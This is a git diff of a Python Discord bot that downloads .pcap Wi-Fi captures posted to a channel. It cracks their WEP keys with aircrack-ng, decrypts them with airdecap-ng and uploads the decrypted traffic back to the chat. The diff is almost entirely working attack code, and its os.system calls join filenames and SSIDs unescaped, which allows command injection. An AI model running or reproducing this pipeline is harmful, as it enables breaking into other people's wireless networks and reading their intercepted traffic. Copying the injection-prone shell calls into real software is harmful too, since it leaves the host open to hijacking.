@@ -5,20 +5,30 @@ import json
 import os
 import platform
 import shutil
-from datetime import datetime
 import colorlog
 import discord
 import requests
+from io import BytesIO  # Import BytesIO at the beginning of your script
 from discord.ext import commands
+from datetime import datetime
+
+
+# TODO Use black . command
+#   Also add docstrings
 
 # TODO Update readme doc.
-# TODO MUST RUN BY SUDO
+#  MUST RUN BY SUDO
+#  They can modify the cracker function for their needs as it is not perfect.
+#  Include what is still expected (true false returns for error checks etc)(must make a CRACKED directory if not exist and store pcaps there, only generate pcaps)
 # TODO Make the perms in readme
-# TODO View Channel
-# TODO Create Invite
-# TODO Read Message History
-# TODO REST IS OFF
-# TODO Add option to upload the file to github, etc
+#  View Channels
+#  Read Message History
+#  Send Messages
+#  Manage Messages (for clearing reactions)
+#  Add Reactions
+#  Attach Files
+#  Create Invites
+#  Link is https://discord.com/oauth2/authorize?client_id=1271825033932832788&permissions=109632&integration_type=0&scope=bot
 # TODO also must explain the reaction symbol meanings
 
 
@@ -159,10 +169,12 @@ def read_key():
     try:
         with open('api.json', 'r') as f:
             config = json.load(f)
-        if config is not None and isinstance(config['token'], str) and isinstance(config['channel_id'], int) and isinstance(
-                config['webhooks_username'], str) and isinstance(config['should_we_crack_files?'], bool) and isinstance(
-                config['limit_of_messages_to_check'], int) and isinstance(config['log_using_debug?'], bool):
-            return config['token'], config['channel_id'], config['webhooks_username'], config['should_we_crack_files?'], config['limit_of_messages_to_check'], config['log_using_debug?']
+        if config is not None and isinstance(config['token'], str) and isinstance(config['channel_id'],
+                                                                                  int) and isinstance(
+                config['webhooks_username'], str) and isinstance(config['limit_of_messages_to_check'],
+                                                                 int) and isinstance(config['log_using_debug?'], bool):
+            return config['token'], config['channel_id'], config['webhooks_username'], config[
+                'limit_of_messages_to_check'], config['log_using_debug?']
         else:
             colorlog.critical("Invalid JSON file format")
             log.critical("Invalid JSON file format")
@@ -174,7 +186,7 @@ def read_key():
 
 
 # All global variables, and required initializations are done here.
-TOKEN, CHANNEL_ID, WEBHOOK_USERNAME, CRACK, LIMIT, DEBUG = read_key()
+TOKEN, CHANNEL_ID, WEBHOOK_USERNAME, LIMIT, DEBUG = read_key()
 if DEBUG:
     logger.setLevel(colorlog.DEBUG)
 else:
@@ -183,20 +195,85 @@ intents = discord.Intents.default()
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
 
 
+@bot.command(name='logs', help='Sends the Discord.log file to the chat.')
+# TODO FIX this
+async def send_logs(ctx):
+    # Ensure the file exists before attempting to read it
+    if os.path.exists("Discord.log"):
+        with open("Discord.log", "r") as file:
+            log_contents = file.read()
+
+        # Send the contents of the log file to the chat
+        await ctx.send(log_contents)
+    else:
+        await ctx.send("The Discord.log file does not exist yet.")
+
+
 @bot.event
 async def on_ready():
+    """
+    Event handler triggered when the bot is fully connected and ready.
+
+    This function is called when the bot has finished connecting to Discord and
+    is ready to start accepting commands and events.
+
+    Parameters:
+    None
+
+    Returns:
+    None
+    """
     colorlog.info(f'We have logged in as {bot.user}')
     log.info(f'We have logged in as {bot.user}')
 
 
 @bot.event
 async def on_message(message):
+    """
+    Event handler triggered when a message is received.
+
+    Parameters:
+        message (discord.Message): The message object containing information about the message.
+
+    Returns:
+        None
+    """
     colorlog.info(f'Message from {message.author}: {message.content}')
     channel_id = CHANNEL_ID
-    await check_old_messages(channel_id)
+    await extract_and_decrypt(channel_id)
 
 
-async def check_old_messages(channel_id):
+async def extract_and_decrypt(channel_id):
+    """
+    Extracts and decrypts pcap files from a specified Discord channel.
+
+    This function iterates over the messages in the specified channel, checks for attachments with a .pcap file extension,
+    and attempts to download and decrypt them. It also handles reactions and error cases.
+
+    Parameters:
+        channel_id (int): The ID of the Discord channel to extract pcap files from.
+
+    Returns:
+        None
+
+    This function performs the following steps:
+    1. Retrieves the specified channel using the provided channel ID.
+    2. Checks if the channel exists, and if not, logs an error and returns.
+    3. Iterates over the messages in the channel, starting from the most recent.
+    4. For each message, checks if the author is the specified webhook username.
+    5. If the author is the specified webhook username, iterates over the attachments of the message.
+    6. For each attachment, checks if the file extension is .pcap.
+    7. If the file extension is .pcap, checks if the message has a reaction with the emoji '👍'.
+    8. If the message has a reaction with the emoji '👍', skips the message and continues to the next one returning to step 3/4.
+    9. Downloads the pcap file using the attachment URL and filename.
+    10. Logs the download status and filename.
+    11. Attempts to crack the pcap file using various tools and techniques.
+    12. If cracking is successful, logs the cracked file status and filename.
+    13. If cracking fails, logs the failure status and filename.
+    14. Adds a reaction to the message based on the cracking result.
+    15. Uploads and deletes the cracked file from the message channel.
+    16. Handles various exceptions and error cases during the process.
+    """
     channel = bot.get_channel(channel_id)
     if channel is None:
         colorlog.error(f"Channel with ID {channel_id} not found.")
@@ -207,7 +284,7 @@ async def check_old_messages(channel_id):
         if message.author.name == WEBHOOK_USERNAME:
             for attachment in message.attachments:
                 if attachment.filename.endswith('.pcap'):
-                    if any(reaction.emoji == '👀' for reaction in message.reactions):
+                    if any(reaction.emoji == '👍' for reaction in message.reactions):
                         colorlog.info("Seen reaction found. Skipping download.")
                         log.info("Seen reaction found. Skipping download.")
                         continue  # Skip this message if the Seen reaction is present
@@ -217,171 +294,9 @@ async def check_old_messages(channel_id):
                     log.info(f'Downloaded {name} from {attachment.url}')
 
                     try:
-                        if CRACK:
-                            colorlog.info("Attempting to crack pcap files...")
-                            log.info("Attempting to crack pcap files...")
-                            try:
-                                if platform.system() != 'Linux':
-                                    colorlog.error(f"Windows is not supported for cracking. Please use Linux.")
-                                    colorlog.warning(
-                                        f"You can skip this step by setting 'should_we_crack' to False in api.json.")
-                                    log.error(f"Windows attempted to be used for cracking. Failed")
-                                    try:
-                                        await message.clear_reactions()
-                                        colorlog.info(f"Cleared all reactions from message ID {message.id}")
-                                        log.info(f"Cleared all reactions from message ID {message.id}")
-                                    except Exception as e:
-                                        colorlog.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                        log.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                    await message.add_reaction('⛔')
-                                else:
-                                    try:
-                                        # TODO Upload the cracked pcap file to the discord channel, with it replying to that message
-                                        def cracker(filename):
-                                            # ------------------------------------------------------------------------------------- #
-                                            #      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK         #
-                                            #                BY TERENCE BROADBENT BSC CYBERSECURITY (FIRST CLASS)                   #
-                                            # ------------------------------------------------------------------------------------- #
-                                            # This is a script that has been borrowed, and translated to python3, from the original #
-                                            # ------------------------------------------------------------------------------------- #
-                                            # AUTHOR  : Terence Broadbent                                                           #
-                                            # ------------------------------------------------------------------------------------- #
-
-                                            try:
-                                                if os.geteuid() != 0:
-                                                    colorlog.critical("Please run this python script as root...")
-                                                    log.critical("Root Running Failed...")
-                                                    exit(1)
-
-                                                if os.path.exists(filename) == 0:
-                                                    colorlog.critical(
-                                                        f"File {filename} was not found, did you spell it correctly?")
-                                                    log.critical(f"File {filename} was not found")
-                                                    exit(1)
-
-                                                checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
-                                                installed = True
-
-                                                for check in checklist:
-                                                    cmd = "locate -i " + check + " > /dev/null"
-                                                    checked = os.system(cmd)
-                                                    if checked != 0:
-                                                        colorlog.warning(f"Could not find {check} in the system...")
-                                                        log.warning(f"Could not find {check} in the system...")
-                                                        installed = False
-
-                                                if not installed:
-                                                    colorlog.critical(
-                                                        "Install those missing dependencies before you begin...")
-                                                    exit(1)
-
-                                                new_filetype = filename[:-2]
-                                                typetest = filename[-6:]
-
-                                                colorlog.debug("Filename: " + filename)
-                                                colorlog.debug("File Format: " + typetest)
-
-                                                if typetest == "pcapng":
-                                                    colorlog.info("Crack Status: Converting file format...")
-                                                    os.system(
-                                                        "editcap -F pcap '" + filename + "' '" + new_filetype + "' > /dev/null")
-                                                    filename = filename[:-2]
-                                                    colorlog.debug("New Filename: " + filename)
-
-                                                os.system("pcapfix -d '" + filename + "' -o Fixerror.pcap > /dev/null")
-
-                                                if os.path.isfile('./Fixerror.pcap') != 0:
-                                                    os.rename(filename, "Oldpcapfile.pcap")
-                                                    os.rename("Fixerror.pcap", filename)
-                                                    colorlog.info(f"Crack Status: Fixing file errors for {filename}..")
-                                                    colorlog.debug("Original Renamed: Oldpcapfile.pcap")
-
-                                                print('-' * 100)
-                                                cmd = "tcpdump -ennr '" + filename + "' '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
-                                                os.system(cmd)
-                                                print('-' * 100)
-
-                                                ssid = open("SSID.txt").readline().rstrip()
-                                                os.remove('./SSID.txt')
-                                                ssid = "00:" + ssid
-
-                                                if ssid == "00:":
-                                                    colorlog.critical(
-                                                        f"Empty SSID: The ssid {ssid} was given, This is not allowed...")
-                                                    log.critical(f"Empty SSID: The ssid {ssid} was found.")
-                                                    exit(1)
-                                                else:
-                                                    colorlog.info(f"Service Set Id: {ssid}")
-
-                                                os.system("aircrack-ng -b " + ssid + " '" + filename + "' > Answer.txt")
-                                                os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
-                                                os.remove('./Answer.txt')
-                                                wep = open("WepKey.txt").readline().rstrip()
-                                                os.remove("./WepKey.txt")
-                                                colorlog.info("Wired Privacy Key : " + wep)
-
-                                                os.system(
-                                                    "airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
-                                                filename2 = filename[:-5]
-                                                filename2 += "-dec.pcap"
-
-                                                # Create the CRACKED directory if it doesn't exist
-                                                if not os.path.exists('CRACKED'):
-                                                    os.makedirs('CRACKED')
-
-                                                # Move the file into the CRACKED directory
-                                                shutil.move(filename2, f'CRACKED/{filename2}')
-
-                                                # Rename the file within the CRACKED directory to include the SSID
-                                                new_filename = f'Cracked_{ssid}.pcap'
-                                                os.rename(f'CRACKED/{filename2}', f'CRACKED/{new_filename}')
-                                                colorlog.info(f"Renamed Cracked File: {new_filename}")
-
-                                                with open(f'Cracked_{ssid}_DATA.txt', 'w') as data_file:
-                                                    data_file.write(f"SSID: {ssid}")
-                                                    data_file.write(f"\nWEP KEY: {wep}")
-                                                colorlog.info(
-                                                    f"Saved Data File: Cracked_{ssid}_DATA.txt with all details collected")
-
-                                            except Exception as e:
-                                                colorlog.error(e)
-                                                log.error(str(e))
-
-                                        cracker(name)
-
-                                        try:
-                                            await message.clear_reactions()
-                                            colorlog.info(f"Cleared all reactions from message ID {message.id}")
-                                            log.info(f"Cleared all reactions from message ID {message.id}")
-                                        except Exception as e:
-                                            colorlog.error(
-                                                f"Failed to clear reactions from message ID {message.id}: {e}")
-                                            log.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                        await message.add_reaction('👀')
-                                    except Exception as e:
-                                        colorlog.error(f"Failed to crack the pcap files...: {e}")
-                                        log.error(f"Failed to crack the pcap files...: {e}")
-                                        try:
-                                            await message.clear_reactions()
-                                            colorlog.info(f"Cleared all reactions from message ID {message.id}")
-                                            log.info(f"Cleared all reactions from message ID {message.id}")
-                                        except Exception as e:
-                                            colorlog.error(
-                                                f"Failed to clear reactions from message ID {message.id}: {e}")
-                                            log.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                        await message.add_reaction('👎')
-                            except Exception as e:
-                                colorlog.critical(f"Unexpected issue occurred: {e}")
-                                log.critical(f"Unexpected issue occurred: {e}")
-                                try:
-                                    await message.clear_reactions()
-                                    colorlog.info(f"Cleared all reactions from message ID {message.id}")
-                                    log.info(f"Cleared all reactions from message ID {message.id}")
-                                except Exception as e:
-                                    colorlog.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                    log.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                                await message.add_reaction('⚠️')
-                        else:
+                        colorlog.info("Attempting to crack pcap files...")
+                        log.info("Attempting to crack pcap files...")
+                        try:
                             try:
                                 await message.clear_reactions()
                                 colorlog.info(f"Cleared all reactions from message ID {message.id}")
@@ -389,32 +304,217 @@ async def check_old_messages(channel_id):
                             except Exception as e:
                                 colorlog.error(f"Failed to clear reactions from message ID {message.id}: {e}")
                                 log.error(f"Failed to clear reactions from message ID {message.id}: {e}")
-                            await message.add_reaction('❌')
+
+                            if platform.system() != 'Linux':
+                                colorlog.error(f"Windows is not supported for cracking. Please use Linux.")
+                                colorlog.warning(
+                                    f"You can skip this step by setting 'should_we_crack' to False in api.json.")
+                                log.error(f"Windows attempted to be used for cracking. Failed")
+                                # Wrong OS
+                                await message.add_reaction('⛔')
+                            else:
+                                try:
+                                    def crack(filename):
+                                        """
+                                        Attempts to crack a pcap file using various tools and techniques.
+
+                                        Parameters:
+                                        filename (str): The name of the pcap file to crack.
+
+                                        Returns:
+                                        bool: True if the cracking process is successful, False otherwise.
+                                        """
+                                        try:
+                                            if os.geteuid() != 0:
+                                                colorlog.critical("Please run this python script as root...")
+                                                log.critical("Root Running Failed...")
+                                                return False
+
+                                            if os.path.exists(filename) == 0:
+                                                colorlog.critical(
+                                                    f"File {filename} was not found, did you spell it correctly?")
+                                                log.critical(f"File {filename} was not found")
+                                                return False
+
+                                            checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
+                                            installed = True
+
+                                            for check in checklist:
+                                                cmd = "locate -i " + check + " > /dev/null"
+                                                checked = os.system(cmd)
+                                                if checked != 0:
+                                                    colorlog.warning(f"Could not find {check} in the system...")
+                                                    log.warning(f"Could not find {check} in the system...")
+                                                    installed = False
+
+                                            if not installed:
+                                                colorlog.critical(
+                                                    "Install those missing dependencies before you begin...")
+                                                return False
+
+                                            new_filetype = filename[:-2]
+                                            typetest = filename[-6:]
+
+                                            colorlog.debug("Filename: " + filename)
+                                            colorlog.debug("File Format: " + typetest)
+
+                                            if typetest == "pcapng":
+                                                colorlog.info("Crack Status: Converting file format...")
+                                                os.system(
+                                                    "editcap -F pcap '" + filename + "' '" + new_filetype + "' > /dev/null")
+                                                filename = filename[:-2]
+                                                colorlog.debug("New Filename: " + filename)
+
+                                            os.system("pcapfix -d '" + filename + "' -o Fixerror.pcap > /dev/null")
+
+                                            if os.path.isfile('./Fixerror.pcap') != 0:
+                                                os.rename(filename, "Oldpcapfile.pcap")
+                                                os.rename("Fixerror.pcap", filename)
+                                                colorlog.info(f"Crack Status: Fixing file errors for {filename}..")
+                                                colorlog.debug("Original Renamed: Oldpcapfile.pcap")
+
+                                            print('-' * 100)
+                                            cmd = "tcpdump -ennr '" + filename + "' '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
+                                            os.system(cmd)
+                                            print('-' * 100)
+
+                                            ssid = open("SSID.txt").readline().rstrip()
+                                            os.remove('./SSID.txt')
+                                            ssid = "00:" + ssid
+
+                                            if ssid == "00:":
+                                                colorlog.critical(
+                                                    f"Empty SSID: The ssid {ssid} was given, This is not allowed...")
+                                                log.critical(f"Empty SSID: The ssid [{ssid}] was found empty as '00:'.")
+                                                return False
+                                            else:
+                                                colorlog.info(f"Service Set Id: {ssid}")
+
+                                            os.system("aircrack-ng -b " + ssid + " '" + filename + "' > Answer.txt")
+                                            os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
+                                            os.remove('./Answer.txt')
+                                            wep = open("WepKey.txt").readline().rstrip()
+                                            os.remove("./WepKey.txt")
+                                            colorlog.info("Wired Privacy Key : " + wep)
+
+                                            os.system(
+                                                "airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
+                                            filename2 = filename[:-5]
+                                            filename2 += "-dec.pcap"
+
+                                            # Create the CRACKED directory if it doesn't exist
+                                            if not os.path.exists('CRACKED'):
+                                                os.makedirs('CRACKED')
+
+                                            shutil.move(filename2, f'CRACKED/{filename2}')
+
+                                            # Rename the file within the CRACKED directory to include the SSID
+                                            new_filename = f'Cracked_{ssid}.pcap'
+                                            try:
+                                                os.rename(f'CRACKED/{filename2}', f'CRACKED/{new_filename}')
+                                                colorlog.info(f"Renamed Cracked File: {new_filename}")
+                                            except FileExistsError:
+                                                os.remove(f'CRACKED/{new_filename}')
+                                                os.rename(f'CRACKED/{filename2}', f'CRACKED/{new_filename}')
+                                                colorlog.info(f"Renamed Cracked File: {new_filename}")
+                                            return True
+                                        except Exception as e:
+                                            colorlog.error(e)
+                                            log.error(str(e))
+                                            return False
+
+                                    crack_test = crack(name)
+                                    if crack_test:
+                                        colorlog.info(f"Crack Status: Successfully cracked {name}")
+                                        log.info(f"Crack Status: Successfully cracked {name}")
+                                        # Cracking succeeded
+                                        await message.add_reaction('👍')
+                                        await upload_and_delete_files(message)
+                                    elif not crack_test:
+                                        colorlog.error(f"Crack Status: Failed to crack {name}")
+                                        log.error(f"Crack Status: Failed to crack {name}")
+                                        # Cracking has failed due to an error in the cracker function
+                                        await message.add_reaction('👎')
+                                    else:
+                                        colorlog.critical("Non Boolean value returned")
+                                        log.error("Non Boolean value returned")
+                                        # Cracking failed due to value error returned from function
+                                        await message.add_reaction('❔')
+
+                                except Exception as e:
+                                    colorlog.error(f"Failed to crack the pcap files...: {e}")
+                                    log.error(f"Failed to crack the pcap files...: {e}")
+                                    # Cracking has failed due to an error from interpreter.
+                                    await message.add_reaction('❌')
+                        except discord.HTTPException as e:
+                            colorlog.critical(f"A discord exception occurred: {e}")
+                            log.critical(f"Discord exception occurred: {e}")
+                            # Error Occurred, cracking was asked, Related to Discord HTTP exceptions.
+                            await message.add_reaction('🚫')
+                        except Exception as e:
+                            colorlog.critical(f"Unexpected issue occurred: {e}")
+                            log.critical(f"Unexpected issue occurred: {e}")
+                            # Error Occurred, cracking was asked.
+                            await message.add_reaction('⚠️')
                     except Exception as e:
                         colorlog.critical(f"Unexpected issue occurred: {e}")
                         log.critical(f"Unexpected issue occurred: {e}")
+                        # Unknown Error Occurred, cracking was asked.
+                        await message.add_reaction('⁉️')
+
+
+async def upload_and_delete_files(message):
+    """
+    Uploads all files in the CRACKED directory as replies to the original message and then deletes them.
+
+    Args:
+        message (discord.Message): The original message that triggered the download.
+    """
+    # Ensure the CRACKED directory exists
+    if not os.path.exists('CRACKED'):
+        colorlog.warning("CRACKED directory does not exist?")
+        log.warning("CRACKED directory does not exist?")
+        return False
+
+    # List all files in the CRACKED directory
+    files_in_cracked = os.listdir('CRACKED')
+
+    # Iterate over each file in the CRACKED directory
+    for file_name in files_in_cracked:
+        # Construct the full path to the file
+        file_path = os.path.join('CRACKED', file_name)
+
+        # Open the file in binary mode and read its content into a BytesIO object
+        with open(file_path, 'rb') as file:
+            file_content = BytesIO(file.read())
+
+            # Upload the BytesIO object as a file in a reply to the original message
+            await message.channel.send(files=[discord.File(file_content, file_name)], reference=message)
+
+            # Delete the file after uploading
+            os.remove(file_path)
+
+    # After uploading and deleting all files, remove the CRACKED directory itself
+    shutil.rmtree('CRACKED')
+    colorlog.info("All files in the 'CRACKED' directory have been uploaded and deleted.")
+    log.info("All files in the 'CRACKED' directory have been uploaded and deleted.")
+    return True
 
 
 async def download_pcap_file(url, filename):
+    """
+    Downloads a pcap file from the given URL and saves it to the specified filename.
+
+    Args:
+        url (str): The URL of the pcap file to download.
+        filename (str): The filename to save the pcap file as.
+
+    Returns:
+        None
+    """
     response = requests.get(url)
     with open(filename, 'wb') as f:
         f.write(response.content)
 
-
-@bot.command(name='logs', help='Sends the Discord.log file to the chat.')
-# TODO FIX this
-async def send_logs(ctx):
-    """
-    Sends the contents of the Discord.log file to the chat when the /logs command is invoked.
-    """
-    # Ensure the file exists before attempting to read it
-    if os.path.exists("Discord.log"):
-        with open("Discord.log", "r") as file:
-            log_contents = file.read()
-
-        # Send the contents of the log file to the chat
-        await ctx.send(log_contents)
-    else:
-        await ctx.send("The Discord.log file does not exist yet.")
 
 bot.run(TOKEN, log_handler=None)
